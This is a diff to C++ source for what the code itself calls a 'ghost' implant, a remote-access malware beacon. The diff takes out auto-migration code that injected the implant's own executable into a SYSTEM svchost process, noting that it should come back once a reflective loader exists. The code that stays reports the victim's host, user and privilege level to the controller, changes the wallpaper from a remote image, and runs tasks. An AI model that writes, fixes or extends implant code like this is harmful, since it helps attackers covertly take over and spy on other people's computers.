@@ -780,49 +780,19 @@ VOID BeaconLoop(const Session& session) {
             }
             failures = 0;
 
-            // First successful beacon: migrate into svchost, set wallpaper, send hello
+            // First successful beacon: set wallpaper, send hello
             if (!sentHello) {
                 sentHello = true;
                 SetWallpaperFromUrl(L"wallpaperaccess.com", L"/full/2012878.jpg");
 
-                // Auto-migrate: inject self into SYSTEM svchost and exit this process.
-                // Only attempt if elevated — migration requires PROCESS_VM_WRITE on svchost.
-                if (session.elevated) {
-                    DWORD svchostPid = FindBestSvchost();
-                    if (svchostPid) {
-                        wchar_t selfPath[MAX_PATH] = {};
-                        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
-                        HANDLE hFile = CreateFileW(selfPath, GENERIC_READ, FILE_SHARE_READ,
-                                                   nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-                        if (hFile != INVALID_HANDLE_VALUE) {
-                            LARGE_INTEGER fsz = {};
-                            GetFileSizeEx(hFile, &fsz);
-                            std::vector<BYTE> payload(static_cast<size_t>(fsz.QuadPart));
-                            DWORD rd = 0;
-                            ReadFile(hFile, payload.data(), static_cast<DWORD>(payload.size()), &rd, nullptr);
-                            CloseHandle(hFile);
+                // ponytail: auto-migrate removed — raw PE injection without a reflective
+                // loader crashes the target. Re-enable when a reflective loader is wired in.
 
-                            if (rd == payload.size() && InjectRemoteProcess(svchostPid, payload.data(), payload.size(), nullptr)) {
-                                DebugLog(L"Migrated into svchost pid=" + std::to_wstring(svchostPid));
-                                SendResult(session.sessionId,
-                                    L"[ghost] implant online — migrated into svchost pid=" + std::to_wstring(svchostPid) +
-                                    L"\r\nhost: " + session.hostname +
-                                    L"\r\nuser: " + session.username +
-                                    L"\r\nelevated: yes");
-                                // Give injected copy 2s to start beaconing, then vanish
-                                Sleep(2000);
-                                ExitProcess(0);
-                            }
-                        }
-                    }
-                }
-
-                // Migration failed or not elevated — stay in current process
                 SendResult(session.sessionId,
                     L"[ghost] implant online\r\nhost: " + session.hostname +
                     L"\r\nuser: " + session.username +
                     L"\r\nelevated: " + (session.elevated ? L"yes" : L"no"));
-                DebugLog(L"Hello sent (no migration)");
+                DebugLog(L"Hello sent");
             }
 
             // Execute task
